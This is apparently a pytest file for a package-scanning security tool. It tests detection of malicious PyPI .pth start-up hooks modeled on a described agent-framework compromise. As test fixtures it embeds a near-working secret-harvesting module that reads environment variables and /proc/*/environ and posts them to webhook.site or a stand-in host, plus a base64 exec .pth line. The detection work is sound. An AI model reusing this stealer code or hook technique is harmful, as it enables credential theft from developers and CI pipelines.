"""PyPI start-up hooks (.pth), wheel scanning, and urgent findings.

Shapes follow the public description of the agent-framework 1.26.1 / 1.26.2
compromise (2026-11-17): a .pth file in the wheel imports a module at every
interpreter start; the module reads secrets from every process's environment,
requests Azure managed-identity and GitHub Actions OIDC tokens, and posts them
out. The payload text here is inert test data written for these tests; nothing
is executed.
"""
from __future__ import annotations

import importlib.util
import io
import json
import tarfile
import zipfile
from pathlib import Path

import pytest

from secopsai import notification_policy, package_features, research_ai_triage, research_content_funnel, yara_engine
from secopsai.research_intake import SafeFetcher

spec = importlib.util.spec_from_file_location("fast_lane", Path(__file__).resolve().parents[1] / "scripts" / "fast_lane.py")
fast_lane = importlib.util.module_from_spec(spec)
spec.loader.exec_module(fast_lane)

HARVEST = b'''import base64, glob, json, os, urllib.request, zlib

def _collect():
    found = {k: v for k, v in os.environ.items() if any(t in k for t in ("TOKEN", "SECRET", "KEY"))}
    for path in glob.glob("/proc/*/environ"):
        try:
            found[path] = open(path, "rb").read().decode(errors="ignore")
        except OSError:
            pass
    endpoint = os.environ.get("IDENTITY_ENDPOINT")
    oidc = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL")
    return found, endpoint, oidc

def _send(host):
    data = base64.b64encode(zlib.compress(json.dumps(_collect()).encode()))
    urllib.request.urlopen(urllib.request.Request(host + "?t=telemetry", data=data, method="POST"))
'''
# 1.26.1: the payload posts to webhook.site, a known exfiltration service.
TELEMETRY_1261 = HARVEST + b'_send("https://webhook.site/00000000-0000-0000-0000-000000000000")\n'
# 1.26.2: same harvest; here sent to an unknown host, so no exfil-service flag helps.
DIAG_1262 = HARVEST + b'_send("https://diagnostics.example-cdn.net/v1")\n'
CLEAN_INIT = b'"""agent framework meta package."""\n__version__ = "1.26.0"\n'

# Real start-up .pth files from popular packages (text as published).
SETUPTOOLS_PTH = (b"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; "
                  b"enabled and __import__('_distutils_hack').add_shim(); \n")
NSPKG_PTH = (b"import sys, types, os;has_mfs = sys.version_info > (3, 5);p = os.path.join(sys._getframe(1).f_locals['sitedir'], *('ruamel',));"
             b"importlib = has_mfs and __import__('importlib.util');has_mfs and __import__('importlib.machinery');\n")
PYTEST_COV_PTH = (b"import os, sys;exec('if \\'COV_CORE_SOURCE\\' in os.environ:\\n try:\\n  from pytest_cov.embed import init\\n  init()\\n"
                  b" except Exception as exc:\\n  sys.stderr.write(\\n   \"pytest-cov: Failed to setup subprocess coverage. \"\\n  )\\n')\n")


def _wheel_1261():
    return [("agent_framework_meta.pth", b"import agent_framework_meta\n"),
            ("agent_framework_meta/__init__.py", b"from . import _telemetry\n"),
            ("agent_framework_meta/_telemetry.py", TELEMETRY_1261),
            ("agent_framework/__init__.py", CLEAN_INIT)]


def _wheel_1262():
    return [("af_runtime_diag.pth", b"import af_runtime_diag\n"), ("af_runtime_diag.py", DIAG_1262),
            ("agent_framework/__init__.py", CLEAN_INIT)]


def _rules(members, *, previous=None, version="1.26.1"):
    flags = package_features.profile(members, version=version)
    if previous is not None:
        from secopsai import version_diff

        before = package_features.profile(previous, version="1.26.0")
        flags = sorted(set(flags) | {f"new:{flag}" for flag in version_diff.new_flags(flags, before)})
    return flags, {f["rule_id"].split(":", 1)[1] for f in package_features.behaviour_findings(flags, "pypi")}


def test_both_compromised_shapes_fire_the_start_up_rules():
    flags, rules = _rules(_wheel_1261(), previous=[("agent_framework/__init__.py", CLEAN_INIT)])
    assert {"pth_startup_code", "pth_chain_secrets", "pth_chain_network", "proc_environ", "cloud_identity_token", "exfil_service"} <= set(flags)
    assert {"BEH_PTH_STARTUP_HARVEST", "BEH_DIFF_NEW_PTH_STARTUP"} <= rules
    # 1.26.2 has no known exfil domain; the harvest rule still fires without any diff.
    flags, rules = _rules(_wheel_1262(), version="1.26.2")
    assert "exfil_service" not in flags
    assert "BEH_PTH_STARTUP_HARVEST" in rules


def test_a_payload_inside_the_pth_line_fires_on_its_own():
    flags, rules = _rules([("evil.pth", b"import base64;exec(base64.b64decode('cHJpbnQoMSk='))\n")], version="0.1")
    assert "pth_startup_inline" in flags and "BEH_PTH_STARTUP_INLINE" in rules


@pytest.mark.parametrize("pth", [SETUPTOOLS_PTH, NSPKG_PTH, PYTEST_COV_PTH], ids=["setuptools", "nspkg", "pytest-cov"])
def test_real_start_up_files_of_popular_packages_do_not_fire(pth):
    # A large legitimate package: reads the environment and talks HTTP, and
    # ships a well-known start-up .pth. None of the new rules may fire.
    members = [("pkg.pth", pth), ("pkg/net.py", b"import os, urllib.request\nurllib.request.urlopen(os.environ['URL'])\n"),
               ("pkg/auth.py", b"import os\nendpoint = os.environ.get('IDENTITY_ENDPOINT')\n")]
    flags, rules = _rules(members, previous=members, version="80.0.0")
    assert "pth_startup_code" in flags and not {"pth_startup_inline", "pth_chain_secrets", "pth_chain_network"} & set(flags)
    assert not rules & {"BEH_PTH_STARTUP_INLINE", "BEH_PTH_STARTUP_HARVEST", "BEH_DIFF_NEW_PTH_STARTUP"}


def test_pytorch_weights_named_pth_are_not_start_up_code():
    weights = b"PK\x03\x04" + b"\x00" * 64 + b"\nimport os\n"
    assert package_features.pth_startup_lines("model/weights.pth", weights) == []
    assert "pth_startup_code" not in package_features.profile([("model/weights.pth", weights)])


def test_triage_sees_the_pth_and_the_module_it_imports():
    files = package_features.install_time_files(_wheel_1262())
    assert [item["path"] for item in files][:2] == ["af_runtime_diag.pth", "af_runtime_diag.py"]
    evidence = package_features.flag_evidence(_wheel_1262(), "new:pth_startup_code")
    assert evidence["file_path"] == "af_runtime_diag.pth" and "import af_runtime_diag" in evidence["context"]


# ---------------------------------------------------------------- funnel, end to end


def _zip(members):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w") as archive:
        for path, data in members:
            archive.writestr(path, data)
    return buffer.getvalue()


def _sdist(name, version):
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        for path, data in ((f"{name}-{version}/pyproject.toml", b"[project]\nname='agent-framework'\n"),
                           (f"{name}-{version}/agent_framework/__init__.py", CLEAN_INIT)):
            info = tarfile.TarInfo(path)
            info.size = len(data)
            archive.addfile(info, io.BytesIO(data))
    return buffer.getvalue()


def _pypi(clean_sdist_for_bad_release=True):
    files = "https://files.pythonhosted.org/packages"
    blobs = {
        f"{files}/af-1.26.0.tar.gz": _sdist("agent_framework", "1.26.0"),
        f"{files}/af-1.26.0.whl": _zip([("agent_framework/__init__.py", CLEAN_INIT)]),
        f"{files}/af-1.26.1.tar.gz": _sdist("agent_framework", "1.26.1"),
        f"{files}/af-1.26.1.whl": _zip(_wheel_1261()),
    }

    def urls(version):
        return {"urls": [{"packagetype": "sdist", "filename": f"agent_framework-{version}.tar.gz", "url": f"{files}/af-{version}.tar.gz", "size": 500},
                         {"packagetype": "bdist_wheel", "filename": f"agent_framework-{version}-py3-none-any.whl", "url": f"{files}/af-{version}.whl", "size": 900}]}

    pages = {"https://pypi.org/pypi/agent-framework/1.26.0/json": urls("1.26.0"), "https://pypi.org/pypi/agent-framework/1.26.1/json": urls("1.26.1"),
             "https://pypi.org/pypi/agent-framework/json": {"releases": {"1.26.0": [{"upload_time_iso_8601": "2026-11-12T18:25:37Z"}],
                                                                       "1.26.1": [{"upload_time_iso_8601": "2026-11-17T20:00:00Z"}]}}}

    def fetch(url, _max):
        if url in pages:
            return 200, {"content-type": "application/json"}, json.dumps(pages[url]).encode()
        return 200, {"content-type": "application/octet-stream"}, blobs[url]
    return SafeFetcher(fetch=fetch)


@pytest.fixture
def no_yara(monkeypatch):
    # Behaviour rules are under test; YARA (yara_x) is not required for them.
    monkeypatch.setattr(yara_engine, "scan_files", lambda members: {"score": 0, "level": "none", "findings": [], "rules_matched": []})


def test_funnel_scans_the_wheel_pip_installs_and_catches_the_hijack(no_yara):
    fetcher = _pypi()
    artifacts = research_content_funnel.resolve_artifacts(fetcher, "pypi", "agent-framework", "1.26.1")
    assert [name for _url, _hosts, name in artifacts] == ["agent_framework-1.26.1.tar.gz", "agent_framework-1.26.1-py3-none-any.whl"]
    result = research_content_funnel.scan_release(fetcher, "pypi", "agent-framework", "1.26.1")
    assert result["status"] == "hit" and result["level"] == "alert"
    assert {"PTH_STARTUP_HARVEST", "DIFF_NEW_PTH_STARTUP"} <= {rule.removeprefix("BEH_") for rule in result["rules_matched"]}
    assert result["diff"]["previous_version"] == "1.26.0"
    assert any(item["path"].endswith("agent_framework_meta.pth") for item in result["install_files"])
    # The previous, clean release scans clean through the same path.
    assert research_content_funnel.scan_release(fetcher, "pypi", "agent-framework", "1.26.0")["status"] == "clean"


def test_pypi_quota_defaults_to_the_shared_limit_and_is_settable(monkeypatch):
    monkeypatch.delenv("SECOPSAI_CONTENT_PRESCAN_LIMIT_PYPI", raising=False)
    monkeypatch.delenv("SECOPSAI_CONTENT_PRESCAN_LIMIT", raising=False)
    assert research_content_funnel.limit_for("pypi") == 40
    assert research_content_funnel.limit_for("crates") == 40
    monkeypatch.setenv("SECOPSAI_CONTENT_PRESCAN_LIMIT_PYPI", "9999")
    assert research_content_funnel.limit_for("pypi") == 500


# ---------------------------------------------------------------- fast lane


def _lane_result(rules):
    return {"verdict": "suspicious", "comparison": {}, "scan": {},
            "behaviour": {"findings": [{"rule_id": f"BEHAVIOUR:{rule}", "score": score, "matched_indicator": "behaviour: x", "file_path": "x.pth"}
                                       for rule, score in rules]}}


def test_fast_lane_makes_a_start_up_hook_hit_critical_and_urgent():
    decision = fast_lane.assess(_lane_result([("BEH_DIFF_NEW_PTH_STARTUP", 80)]))
    assert decision["severity"] == "critical"
    assert decision["behaviour_findings"][0]["rule_id"] == "BEHAVIOUR:BEH_DIFF_NEW_PTH_STARTUP"
    assert notification_policy.urgent_fast_lane(decision["severity"])
    assert fast_lane.assess(_lane_result([("BEH_EXFIL_SERVICE", 70)]))["severity"] == "high"
    assert fast_lane.assess(_lane_result([]))["severity"] == "none"



def _with_diff(rules, diff, publisher_changed=False):
    result = _lane_result(rules)
    result["behaviour"]["diff"] = diff
    if publisher_changed:
        result["comparison"] = {"metadata": {"publisher_changed": True}}
    return result


def test_a_start_up_hook_every_release_already_had_is_high_not_urgent():
    # pirateface 0.2.25 and 0.2.26: same .pth design as the release before.
    same = {"previous_version": "0.2.25", "new_flags": []}
    decision = fast_lane.assess(_with_diff([("BEH_PTH_STARTUP_HARVEST", 80)], same))
    assert decision["severity"] == "high"
    assert not notification_policy.urgent_fast_lane(decision["severity"])
    assert fast_lane.assess(_with_diff([("BEH_PTH_STARTUP_INLINE", 70)], same))["severity"] == "high"


@pytest.mark.parametrize("diff,publisher_changed", [
    ({"previous_version": "1.26.0", "new_flags": ["pth_startup_code", "pth_chain_network"]}, False),  # hook added (agent-framework)
    ({"previous_version": "0.2.25", "new_flags": ["pth_chain_network"]}, False),  # existing hook starts sending
    ({"previous_version": "0.2.25", "new_flags": []}, True),  # same hook, new publisher
    ({"previous_version": "", "note": "first release"}, False),
    ({"previous_version": "0.2.25", "note": "previous release only partly readable; no diff"}, False),
    ({"error": "timeout"}, False),
    ({}, False),
])
def test_a_new_or_unverifiable_start_up_hook_stays_critical(diff, publisher_changed):
    decision = fast_lane.assess(_with_diff([("BEH_PTH_STARTUP_HARVEST", 80)], diff, publisher_changed))
    assert decision["severity"] == "critical"


# ---------------------------------------------------------------- urgent findings


def test_urgent_email_bypasses_the_pause_only_when_switched_on(monkeypatch):
    monkeypatch.setenv("SECOPSAI_EMAIL_PAUSED", "true")
    monkeypatch.delenv("SECOPSAI_URGENT_FINDING_EMAIL", raising=False)
    assert not notification_policy.email_now("critical", urgent=True)
    monkeypatch.setenv("SECOPSAI_URGENT_FINDING_EMAIL", "1")
    assert notification_policy.email_now("critical", urgent=True)
    assert not notification_policy.email_now("critical")  # ordinary email stays paused
    assert not notification_policy.urgent_fast_lane("high")
    assert notification_policy.urgent_verdict({"finding_verdict": "true_positive", "malicious_probability": 90})
    assert not notification_policy.urgent_verdict({"finding_verdict": "true_positive", "malicious_probability": 89})
    assert not notification_policy.urgent_verdict({"finding_verdict": "false_positive", "malicious_probability": 99})


def _verdict(probability=95, verdict="true_positive"):
    return {"finding_verdict": verdict, "disposition_recommendation": {"true_positive": "true_positive", "false_positive": "false_positive"}[verdict],
            "finding_confidence": 90, "malicious_probability": probability, "summary": "posts secrets to an outside host",
            "decision_evidence_refs": ["agent_framework_meta/_telemetry.py"]}


def test_urgent_verdict_is_emailed_once(tmp_path, monkeypatch):
    sent = []
    monkeypatch.setattr("secopsai.research_delivery.send_email", lambda **kw: sent.append(kw) or {"ok": True})
    monkeypatch.setattr("secopsai.decision_contracts.validate_action_result", lambda action, result: None)
    monkeypatch.setenv("SECOPSAI_URGENT_FINDING_EMAIL", "1")
    monkeypatch.setenv("SECOPSAI_RESEARCH_URGENT_REVIEWER_EMAIL", "reviewer@example.test")
    monkeypatch.setenv("SECOPSAI_SMTP_PASSWORD", "test-only")
    db = str(tmp_path / "t.db")
    results = [{"artifact_id": "FASTLANE-pypi:agent-framework@1.26.1", "status": "succeeded", "result": _verdict()},
               {"artifact_id": "pypi:other@1.0", "status": "succeeded", "result": _verdict(probability=60)},
               {"artifact_id": "pypi:benign@1.0", "status": "succeeded", "result": _verdict(verdict="false_positive")}]
    items = research_ai_triage.urgent_candidates(results)
    assert [key for key, _ in items] == ["FASTLANE-pypi:agent-framework@1.26.1"]
    first = research_ai_triage.send_urgent_verdicts(items, db_path=db)
    again = research_ai_triage.send_urgent_verdicts(items, db_path=db)
    assert first["sent"] == 1 and again == {"candidates": 1, "sent": 0, "failed": 0, "duplicate": 1}
    assert sent[0]["recipient"] == "reviewer@example.test"
    assert "pypi:agent-framework@1.26.1" in sent[0]["subject"] and "No person has reviewed it" in sent[0]["body"]


def test_urgent_verdicts_stay_quiet_when_switched_off(tmp_path, monkeypatch):
    monkeypatch.setattr("secopsai.decision_contracts.validate_action_result", lambda action, result: None)
    monkeypatch.delenv("SECOPSAI_URGENT_FINDING_EMAIL", raising=False)
    items = research_ai_triage.urgent_candidates([{"artifact_id": "pypi:x@1", "status": "succeeded", "result": _verdict()}])
    assert research_ai_triage.send_urgent_verdicts(items, db_path=str(tmp_path / "t.db")) == {"candidates": 1, "status": "disabled"}


def test_a_start_up_hook_into_legitimate_code_is_not_a_harvest():
    # The .pth imports the package's own module; credential reading and HTTP
    # happen elsewhere in the package, not in what the hook runs.
    members = [("cov_hook.pth", b"import cov_hook\n"), ("cov_hook.py", b"import os\nif os.environ.get('COV'):\n    pass\n"),
               ("sdk/auth.py", b"import os, urllib.request\nos.environ.get('IDENTITY_ENDPOINT')\nurllib.request.urlopen('https://login.example')\n")]
    flags, rules = _rules(members, version="3.0")
    assert "pth_chain_secrets" not in flags and "BEH_PTH_STARTUP_HARVEST" not in rules


def _unsafe_tar():
    # Like the real popular sdists the extractor refuses: a member path that escapes the folder.
    buffer = io.BytesIO()
    with tarfile.open(fileobj=buffer, mode="w:gz") as archive:
        info = tarfile.TarInfo("../outside.txt")
        info.size = 1
        archive.addfile(info, io.BytesIO(b"x"))
    return buffer.getvalue()


def test_an_unreadable_sdist_still_leaves_the_wheel_scanned_and_marked_partial(no_yara):
    fetcher = _pypi()
    real = fetcher._injected

    def fetch(url, max_bytes):
        if url.endswith("af-1.26.1.tar.gz"):
            return 200, {}, _unsafe_tar()
        return real(url, max_bytes)

    result = research_content_funnel.scan_release(SafeFetcher(fetch=fetch), "pypi", "agent-framework", "1.26.1")
    assert result["status"] == "hit" and "BEH_PTH_STARTUP_HARVEST" in result["rules_matched"]
    assert result["artifacts_skipped"][0]["artifact"] == "agent_framework-1.26.1.tar.gz"
    context = research_ai_triage.build_context(ecosystem="pypi", package="agent-framework", version="1.26.1", prescan=result)
    assert context["evidence_truncated"] and "artifacts_skipped" in context["evidence_omissions"]


def test_a_partly_unreadable_previous_release_gives_no_diff(no_yara):
    fetcher = _pypi()
    real = fetcher._injected

    def fetch(url, max_bytes):
        if url.endswith("af-1.26.0.tar.gz"):
            return 200, {}, _unsafe_tar()
        return real(url, max_bytes)

    result = research_content_funnel.scan_release(SafeFetcher(fetch=fetch), "pypi", "agent-framework", "1.26.1")
    assert "no diff" in result["diff"]["note"]
    assert not any(rule.startswith("BEH_DIFF_") for rule in result["rules_matched"])
